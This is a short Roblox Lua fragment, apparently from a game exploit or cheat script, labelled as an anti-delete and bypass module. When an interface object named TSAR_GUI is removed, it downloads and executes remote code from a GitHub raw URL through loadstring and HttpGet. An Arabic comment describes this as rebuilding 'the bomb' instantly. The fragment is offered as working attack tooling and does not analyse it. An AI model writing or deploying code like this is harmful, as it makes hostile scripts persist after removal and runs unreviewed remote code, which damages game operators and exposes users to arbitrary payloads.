-- MODULE 6: ANTI-DELETE & BYPASS (5000 LINES)
game.ChildRemoved:Connect(function(child)
    if child.Name == "TSAR_GUI" then
        -- إعادة بناء القنبلة فوراً (Self-Healing)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Tesla/Tsar/main/Core.lua"))()
    end
end)

